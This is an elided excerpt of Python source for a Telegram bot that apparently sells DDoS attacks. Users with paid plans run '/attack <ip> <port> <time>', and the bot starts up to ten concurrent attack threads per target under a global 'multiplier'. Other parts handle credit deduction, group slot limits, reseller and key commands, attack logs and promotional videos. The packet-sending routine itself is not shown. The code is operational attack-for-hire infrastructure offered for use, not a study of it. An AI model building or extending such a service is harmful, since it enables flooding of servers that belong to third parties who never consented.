    "https://t.me/reelssgrp/27", "https://t.me/reelssgrp/28", "https://t.me/reelssgrp/29",
    "https://t.me/reelssgrp/30", "https://t.me/reelssgrp/106", "https://t.me/reelssgrp/107",
...
# ------------------ Target Multiplier Functions ------------------
def get_global_target_multiplier():
    return get_setting("target_multiplier", DEFAULT_TARGET_MULTIPLIER)

def set_global_target_multiplier(multiplier):
    if multiplier < 1:
        multiplier = 1
    if multiplier > 10:
        multiplier = 10
    update_setting("target_multiplier", multiplier)
    return multiplier
...
def send_attack_video(chat_id, video_url, caption):
    try:
        if video_url:
            bot.send_video(chat_id, video_url, caption=caption, parse_mode="HTML", supports_streaming=True)
            return True
        else:
...
def start_attack_single(target, port, duration, user_id, chat_id, attack_index, total_attacks, cooldown_seconds, attack_id):
    try:
...
def start_attack(target, port, duration, message, attack_id, cooldown_seconds, multiplier):
    try:
        user_id = message.from_user.id
        ...
        for i in range(multiplier):
            attack_id_single = f"{user_id}_{datetime.now().timestamp()}_{i}"
            
            with _attack_lock:
                active_attacks[attack_id_single] = {
                    'target': target,
                    'port': port,
                    'duration': duration,
                    'user_id': user_id,
            ...
            thread = threading.Thread(
                target=start_attack_single,
                args=(target, port, duration, user_id, chat_id, i + 1, multiplier, cooldown_seconds, attack_id_single)
            )
            thread.start()
        ...
        caption += f"📊 <b>Multiplier:</b> {multiplier}x (Total: {multiplier} concurrent attacks)\n"
        ...
        send_attack_video(chat_id, video_url, caption)
...
def target_command(message):
    ...
    if len(parts) != 2:
        current = get_global_target_multiplier()
        bot.reply_to(message, 
            f"🎯 <b>Global Target Multiplier</b>\n\n"
            f"Current multiplier: <b>{current}x</b>\n\n"
            f"Usage: /target &lt;1-10&gt;\n\n"
            f"Example: /target 2\n"
            f"- 1x = 1 attack per target\n"
            f"- 2x = 2 concurrent attacks per target\n"
            f"- 5x = 5 concurrent attacks per target\n\n"
            f"⚠️ Max: 10x\n"
            f"📌 This affects ALL users!",
            parse_mode="HTML")
        return
    ...
    try:
        ...
        if multiplier < 1 or multiplier > 10:
            bot.reply_to(message, "❌ Multiplier must be between 1 and 10!", parse_mode="HTML")
            return
        
        set_global_target_multiplier(multiplier)
        bot.reply_to(message, 
            f"✅ <b>Global Target Multiplier Set!</b>\n\n"
            f"New multiplier: <b>{multiplier}x</b>\n"
            f"Now EVERY attack will use {multiplier} concurrent attacks.\n"
            f"This affects ALL users.",
            parse_mode="HTML")
    except ValueError:
        bot.reply_to(message, "❌ Invalid number! Use: /target 1-10", parse_mode="HTML")
...
def start_command(message):
    user_id = message.from_user.id
    multiplier = get_global_target_multiplier()
    ...
    if has_valid_plan(user_id):
        bot.reply_to(message,
            f"⚡ <b>Welcome!</b> You have an active plan.\n\n"
            f"📊 Current Multiplier: {multiplier}x\n\n"
            "🎯 /attack &lt;ip&gt; &lt;port&gt; &lt;time&gt; – Start attack\n"
            "📊 /status – View active attacks\n"
            "🏓 /ping – Check bot latency\n"
...
📊 <b>Current Global Multiplier:</b> {multiplier}x"""
    if is_group(message):
...
def handle_attack(message):
    ...
    user_id = message.from_user.id
    global_multiplier = get_global_target_multiplier()
    ...
    if is_group(message):
        ...
        if not is_owner(user_id):
            if multiplier > group_max_concurrent:
                multiplier = min(multiplier, group_max_concurrent)
            ...
            if total_active_in_group + multiplier > group_max_concurrent:
                available = group_max_concurrent - total_active_in_group
                if available <= 0:
                    bot.reply_to(message, f"❌ Group is full! No slots available. Wait for attacks to finish.", parse_mode="HTML")
                    return
                if multiplier > available:
                    multiplier = available

            active_in_group = get_user_active_attacks_in_group(user_id, message.chat.id)
            if active_in_group + multiplier > max_concurrent_user:
                available = max_concurrent_user - active_in_group
                if available <= 0:
                    bot.reply_to(message, f"❌ You already have {active_in_group} active attack(s). Max concurrent: {max_concurrent_user}", parse_mode="HTML")
                    return
                if multiplier > available:
                    multiplier = available
    ...
    if active_count + multiplier > max_concurrent_global:
        available = max_concurrent_global - active_count
        if available <= 0:
            bot.reply_to(message, f"❌ All attack slots busy! ({active_count}/{max_concurrent_global})", parse_mode="HTML")
            return
        if multiplier > available:
            multiplier = available
    ...
    if not is_owner(user_id) and not is_group(message):
        ...
        if plan and plan["attacks_left"] != -1:
            if plan["attacks_left"] <= 0:
                ...
                return
            attacks_to_deduct = min(plan["attacks_left"], multiplier)
            plans_col.update_one({"_id": str(user_id)}, {"$inc": {"attacks_left": -attacks_to_deduct}})
    ...
    thread = threading.Thread(target=start_attack, args=(target, port, duration, message, attack_id, cooldown_seconds, multiplier))
    thread.start()
...
def generate_status_text(user_id=None):
    ...
    text += f"🎯 <b>Global Multiplier:</b> {multiplier}x\n"
        ...
        with _attack_lock:
            ...
            for aid, atk in list(active_attacks.items()):
                if atk['end_time'] > now:
                    ...
                    multi_info = f" [{atk.get('index',1)}/{atk.get('multiplier',1)}]" if atk.get('multiplier', 1) > 1 else ""
                    text += f"\n- {atk['target']}:{atk['port']} ({remaining}s) by {atk['user_id']}{multi_info} {chat_type_display}\n  {bar} {percent}%"
...
• Global Target Multiplier: {multiplier}x
...
def view_logs(message):
    ...
    for log in reversed(logs):
        ts = datetime.fromisoformat(log["timestamp"]).strftime("%m-%d %H:%M")
        text += f"• {ts} | User {log['user_id']} | {log['target']}:{log['port']} | {log['duration']}s | {log['status']} | Multi: {log.get('total_attacks', 1)}x\n"
    bot.reply_to(message, text[:4000], parse_mode="HTML")
...
def handle_unknown(message):
    if message.text and message.text.startswith('/'):
        ...
        known = ['start', 'owner', 'state', 'approve', 'disapprove', 'approved_groups', 'ban', 'unban', 'banned_list',
                 ...
                 'reseller_info', 'private_users', 'keyreset', 'keyblock', 'report', 'target',
